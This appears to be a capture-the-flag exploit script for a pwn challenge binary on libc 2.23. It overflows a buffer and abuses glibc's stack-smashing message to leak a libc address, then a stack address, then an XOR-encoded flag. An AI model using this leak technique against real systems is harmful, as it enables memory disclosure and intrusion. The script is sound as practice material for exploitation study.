#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc-2.23.so")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b"What's your name?\n")
s(b"\x00")

ru(b"Your random id is: ")
key = int(ru(b"\n", drop=True))
lg("key", key)

ru(b"What do you want to do?\n")
payload = b"a" * 0x128
payload += p64(0x602018)
sl(payload)
ru(b"*** stack smashing detected ***: ")
leak = ru(b" terminated", drop=True)
libc_base = u64_ex(leak[:6]) - 0x6F6A0
lg("libc_base", libc_base)

ru(b"What's your name?\n")
s(b"\x00")

ru(b"Your random id is: ")
key = int(ru(b"\n", drop=True))
lg("key", key)
ru(b"What do you want to do?\n")
payload = b"a" * 0x128
payload += p64(libc_base + 0x3C6F38)
sl(payload)
ru(b"*** stack smashing detected ***: ")
leak = ru(b" terminated", drop=True)
stack_base = u64_ex(leak[:6])
lg("stack_base", stack_base)


ru(b"What's your name?\n")
s(b"\x00")

ru(b"Your random id is: ")
key = int(ru(b"\n", drop=True))
lg("key", key)
ru(b"What do you want to do?\n")
payload = b"a" * 0x128
payload += p64(stack_base - 0x178)
sl(payload)
ru(b"*** stack smashing detected ***: ")
# leak = ru(b" terminated", drop=True)
# stack_base = u64_ex(leak[:6])
# lg("stack_base", stack_base)

flag = ru(b" terminated", drop=True)

print(flag)

final = ""
for i in range(len(flag)):
    print(chr(flag[i] ^ key), end="")

print()

ia()
